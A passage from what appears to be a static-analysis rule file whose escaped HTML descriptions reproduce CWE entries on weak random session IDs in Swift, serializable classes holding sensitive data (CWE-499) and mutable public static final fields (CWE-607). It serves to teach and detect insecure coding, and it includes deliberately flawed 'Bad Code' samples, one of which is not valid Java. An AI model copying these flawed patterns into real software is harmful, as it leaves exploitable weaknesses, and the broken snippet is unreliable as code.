&lt;/pre&gt;&lt;h3&gt;Swift&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;let sessNum = rand();
let sessionId = String(format:"%ld", sessNum)&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;var sessBytes: UInt32 = 0
withUnsafeMutablePointer(&amp;sessBytes, { (sessBytesPointer) -&gt; Void in
    let castedPointer = unsafeBitCast(sessBytesPointer, UnsafeMutablePointer&lt;UInt8&gt;.self)
    SecRandomCopyBytes(kSecRandomDefault, sizeof(UInt32), castedPointer)
})
    
let sessionId = String(format:"%llu", sessBytes)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1660</key><name>Serializable_Class_Containing_Sensitive_Data</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Serializable Class Containing Sensitive Data&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;499&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_499_Description" id="oc_499_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The code contains a class with sensitive data, but the class
does not explicitly deny serialization. The data can be accessed by serializing
the class through another class.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Serializable classes are effectively open classes since data cannot be
hidden in them. Classes that do not explicitly deny serialization can be
serialized by any other class, which can then in turn use the data stored
inside it.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_499_Time of Introduction" id="oc_499_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_499_Applicable Platforms" id="oc_499_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_499_Common Consequences" id="oc_499_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;an attacker can write out the class to a byte stream, then extract the
important data from it.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_499_Likelihood of Exploit" id="oc_499_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_499_Demonstrative Examples" id="oc_499_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;class Teacher {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;private String name;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;private String clas;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public Teacher(String name,String clas) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;//...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;//Check the database for the name and address&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;this.SetName() = name;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;this.Setclas() = clas;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_499_Potential Mitigations" id="oc_499_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;In Java, explicitly define final writeObject() to prevent
serialization. This is the recommended solution. Define the
writeObject() function to throw an exception explicitly denying
serialization.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Make sure to prevent serialization of your objects.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_499_Relationships" id="oc_499_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;485&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=485" target="_blank"&gt;Insufficient Encapsulation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;200&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=200" target="_blank"&gt;Information Exposure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_499_Taxonomy Mappings" id="oc_499_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Information leak through serialization&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_499_Content History" id="oc_499_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Description, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Information Leak through
Serialization&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1656</key><name>Public_Static_Final_References_Mutable_Object</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Public Static Final Field References Mutable Object&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;607&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_607_Description" id="oc_607_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A public or protected static final field references a mutable
object, which allows the object to be changed by malicious code, or accidentally
from another package&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_607_Time of Introduction" id="oc_607_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_607_Applicable Platforms" id="oc_607_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_607_Demonstrative Examples" id="oc_607_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Here, an array (which is inherently mutable) is labeled public
static final.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public static final String[] USER_ROLES;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_607_Potential Mitigations" id="oc_607_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Protect mutable objects by making them private. Restrict access to the
getter and setter as well.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_607_Relationships" id="oc_607_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;471&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=471" target="_blank"&gt;Modification of Assumed-Immutable Data (MAID)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;485&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=485" target="_blank"&gt;Insufficient Encapsulation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_607_Content History" id="oc_607_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3877</key><name>Private_Array_Returned_From_A_Public_Method</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Private Array-Typed Field Returned From A Public Method&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

